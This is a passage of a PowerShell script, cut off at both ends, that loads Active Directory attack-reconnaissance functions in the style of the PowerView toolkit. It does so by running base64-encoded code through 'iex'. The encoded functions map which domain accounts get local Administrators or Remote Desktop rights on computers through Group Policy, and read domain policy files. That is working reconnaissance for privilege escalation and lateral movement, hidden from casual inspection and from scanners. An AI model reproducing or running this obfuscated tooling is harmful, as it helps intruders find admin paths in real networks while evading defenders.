ENvbW1vbkFyZ3VtZW50cyAtUHJvcGVydGllcyAnZG5zaG9zdG5hbWUnIC1TZWFyY2hCYXNlICRfLlBhdGggfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRPVUNvbXB1dGVycykgewogICAgICAgICAgICAgICAgICAgIGlmICgkT1VDb21wdXRlcnMgLWlzbm90IFtTeXN0ZW0uQXJyYXldKSB7JE9VQ29tcHV0ZXJzID0gQCgkT1VDb21wdXRlcnMpfQogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRTaWQgaW4gJFRhcmdldE9iamVjdFNJRHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJFRhcmdldFNpZCAtUHJvcGVydGllcyAnc2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lkJwogICAgICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9IEAoJzI2ODQzNTQ1NicsJzI2ODQzNTQ1NycsJzUzNjg3MDkxMicsJzUzNjg3MDkxMycpIC1jb250YWlucyAkT2JqZWN0LnNhbWFjY291bnR0eXBlCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdE5hbWUnICRPYmplY3Quc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdEROJyAkT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RTSUQnICRPYmplY3Qub2JqZWN0c2lkCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEb21haW4nICREb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQT25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0d1aWQnICRHUE9HdWlkCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9QYXRoJyAkR1BPUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPVHlwZScgJEdQT1R5cGUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbnRhaW5lck5hbWUnICRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJE9VQ29tcHV0ZXJzCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPTG9jYWxHcm91cE1hcHBpbmcnKQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgR2V0LURvbWFpblNpdGUgQENvbW1vbkFyZ3VtZW50cyAtUHJvcGVydGllcyAnc2l0ZW9iamVjdGJsLGRpc3Rpbmd1aXNoZWRuYW1lJyAtR1BMaW5rICRHUE9HdWlkIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldFNpZCBpbiAkVGFyZ2V0T2JqZWN0U0lEcykgewogICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSBHZXQtRG9tYWluT2JqZWN0IEBDb21tb25Bcmd1bWVudHMgLUlkZW50aXR5ICRUYXJnZXRTaWQgLVByb3BlcnRpZXMgJ3NhbWFjY291bnR0eXBlLHNhbWFjY291bnRuYW1lLGRpc3Rpbmd1aXNoZWRuYW1lLG9iamVjdHNpZCcKICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9IEAoJzI2ODQzNTQ1NicsJzI2ODQzNTQ1NycsJzUzNjg3MDkxMicsJzUzNjg3MDkxMycpIC1jb250YWlucyAkT2JqZWN0LnNhbWFjY291bnR0eXBlCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3ROYW1lJyAkT2JqZWN0LnNhbWFjY291bnRuYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdEROJyAkT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdFNJRCcgJE9iamVjdC5vYmplY3RzaWQKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNHcm91cCcgJElzR3JvdXAKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRG9tYWluJyAkRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkR1BPbmFtZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9HdWlkJyAkR1BPR3VpZAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9QYXRoJyAkR1BPUGF0aAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9UeXBlJyAkR1BPVHlwZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb250YWluZXJOYW1lJyAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRfLnNpdGVvYmplY3RibAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZy5QU09iamVjdC5UeXBlTmFtZXMuQWRkKCdQb3dlclZpZXcuR1BPTG9jYWxHcm91cE1hcHBpbmcnKQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdQT0NvbXB1dGVyTG9jYWxHcm91cE1hcHBpbmcgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuR0dQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlcicpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJJZGVudGl0eScpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJJZGVudGl0eScsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnQ29tcHV0ZXJOYW1lJywgJ0NvbXB1dGVyJywgJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlcklkZW50aXR5LAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnT1VJZGVudGl0eScpXQogICAgICAgIFtBbGlhcygnT1UnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPVUlkZW50aXR5LAogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBZG1pbmlzdHJhdG9ycycsICdTLTEtNS0zMi01NDQnLCAnUkRQJywgJ1JlbW90ZSBEZXNrdG9wIFVzZXJzJywgJ1MtMS01LTMyLTU1NScpXQogICAgICAgICRMb2NhbEdyb3VwID0gJ0FkbWluaXN0cmF0b3JzJywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJENvbW1vbkFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb21tb25Bcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbW1vbkFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlcklkZW50aXR5J10pIHsKICAgICAgICAgICAgJENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tbW9uQXJndW1lbnRzIC1JZGVudGl0eSAkQ29tcHV0ZXJJZGVudGl0eSAtUHJvcGVydGllcyAnZGlzdGluZ3Vpc2hlZG5hbWUsZG5zaG9zdG5hbWUnCiAgICAgICAgICAgIGlmICgtbm90ICRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICJbR2V0LURvbWFpbkdQT0NvbXB1dGVyTG9jYWxHcm91cE1hcHBpbmddIENvbXB1dGVyICRDb21wdXRlcklkZW50aXR5IG5vdCBmb3VuZC4gVHJ5IGEgZnVsbHkgcXVhbGlmaWVkIGhvc3QgbmFtZS4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRHUE9HdWlkcyA9IEAoKQogICAgICAgICAgICAgICAgJEROID0gJENvbXB1dGVyLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAkT1VJbmRleCA9ICRETi5JbmRleE9mKCdPVT0nKQogICAgICAgICAgICAgICAgaWYgKCRPVUluZGV4IC1ndCAwKSB7CiAgICAgICAgICAgICAgICAgICAgJE9VTmFtZSA9ICRETi5TdWJTdHJpbmcoJE9VSW5kZXgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJE9VTmFtZSkgewogICAgICAgICAgICAgICAgICAgICRHUE9HdWlkcyArPSBHZXQtRG9tYWluT1UgQENvbW1vbkFyZ3VtZW50cyAtU2VhcmNoQmFzZSAkT1VOYW1lIC1MREFQRmlsdGVyICcoZ3BsaW5rPSopJyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgU2VsZWN0LVN0cmluZyAtSW5wdXRPYmplY3QgJF8uZ3BsaW5rIC1QYXR0ZXJuICcoXHspezAsMX1bMC05YS1mQS1GXXs4fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17MTJ9KFx9KXswLDF9JyAtQWxsTWF0Y2hlcyB8IEZvckVhY2gtT2JqZWN0IHskXy5NYXRjaGVzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgVmFsdWUgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkVudW1lcmF0aW5nIHRoZSBzaXRlbmFtZSBmb3I6ICQoJENvbXB1dGVyLmRuc2hvc3RuYW1lKSIKICAgICAgICAgICAgICAgICRDb21wdXRlclNpdGUgPSAoR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXIuZG5zaG9zdG5hbWUpLlNpdGVOYW1lCiAgICAgICAgICAgICAgICBpZiAoJENvbXB1dGVyU2l0ZSAtYW5kICgkQ29tcHV0ZXJTaXRlIC1ub3RtYXRjaCAnRXJyb3InKSkgewogICAgICAgICAgICAgICAgICAgICRHUE9HdWlkcyArPSBHZXQtRG9tYWluU2l0ZSBAQ29tbW9uQXJndW1lbnRzIC1JZGVudGl0eSAkQ29tcHV0ZXJTaXRlIC1MREFQRmlsdGVyICcoZ3BsaW5rPSopJyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgU2VsZWN0LVN0cmluZyAtSW5wdXRPYmplY3QgJF8uZ3BsaW5rIC1QYXR0ZXJuICcoXHspezAsMX1bMC05YS1mQS1GXXs4fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17MTJ9KFx9KXswLDF9JyAtQWxsTWF0Y2hlcyB8IEZvckVhY2gtT2JqZWN0IHskXy5NYXRjaGVzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgVmFsdWUgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRHUE9HdWlkcyB8IEdldC1Eb21haW5HUE9Mb2NhbEdyb3VwIEBDb21tb25Bcmd1bWVudHMgfCBTb3J0LU9iamVjdCAtUHJvcGVydHkgR1BPTmFtZSAtVW5pcXVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCA9ICRfCiAgICAgICAgICAgICAgICAgICAgaWYoJEdQT0dyb3VwLkdyb3VwTWVtYmVycykgewogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTWVtYmVycyA9ICRHUE9Hcm91cC5Hcm91cE1lbWJlcnMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9NZW1iZXJzID0gJEdQT0dyb3VwLkdyb3VwU0lECiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRHUE9NZW1iZXJzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0ID0gR2V0LURvbWFpbk9iamVjdCBAQ29tbW9uQXJndW1lbnRzIC1JZGVudGl0eSAkXwogICAgICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9IEAoJzI2ODQzNTQ1NicsJzI2ODQzNTQ1NycsJzUzNjg3MDkxMicsJzUzNjg3MDkxMycpIC1jb250YWlucyAkT2JqZWN0LnNhbWFjY291bnR0eXBlCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIuZG5zaG9zdG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3ROYW1lJyAkT2JqZWN0LnNhbWFjY291bnRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnT2JqZWN0RE4nICRPYmplY3QuZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RTSUQnICRfCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNHcm91cCcgJElzR3JvdXAKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQT0dyb3VwLkdQT0Rpc3BsYXlOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPR3VpZCcgJEdQT0dyb3VwLkdQT05hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9QYXRoJyAkR1BPR3JvdXAuR1BPUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT1R5cGUnICRHUE9Hcm91cC5HUE9UeXBlCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIuUFNPYmplY3QuVHlwZU5hbWVzLkFkZCgnUG93ZXJWaWV3LkdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlcicpCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblBvbGljeURhdGEgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtIYXNodGFibGVdKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1NvdXJjZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUG9saWN5ID0gJ0RvbWFpbicsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkQ29udmVydEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb252ZXJ0QXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29udmVydEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4KICAgICAgICAgICAgJENvbnZlcnRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgIH0KICAgICAgICBpZiAoJFBvbGljeSAtZXEgJ0FsbCcpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJyonCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBvbGljeSAtZXEgJ0RvbWFpbicpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJ3szMUIyRjM0MC0wMTZELTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9JwogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCgkUG9saWN5IC1lcSAnRG9tYWluQ29udHJvbGxlcicpIC1vciAoJFBvbGljeSAtZXEgJ0RDJykpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJ3s2QUMxNzg2Qy0wMTZGLTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9JwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFBvbGljeQogICAgICAgIH0KICAgICAgICAkR1BPUmVzdWx0cyA9IEdldC1Eb21haW5HUE8gQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgRm9yRWFjaCAoJEdQTyBpbiAkR1BPUmVzdWx0cykgewogICAgICAgICAgICAkR3B0VG1wbFBhdGggPSAkR1BPLmdwY2ZpbGVzeXNwYXRoICsgIlxNQUNISU5FXE1pY3Jvc29mdFxXaW5kb3dzIE5UXFNlY0VkaXRcR3B0VG1wbC5pbmYiCiAgICAgICAgICAgICRQYXJzZUFyZ3MgPSAgQHsKICAgICAgICAgICAgICAgICdHcHRUbXBsUGF0aCcgPSAkR3B0VG1wbFBhdGgKICAgICAgICAgICAgICAgICdPdXRwdXRPYmplY3QnID0gJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFBhcnNlQXJnc1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICBHZXQtR3B0VG1wbCBAUGFyc2VBcmdzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJF8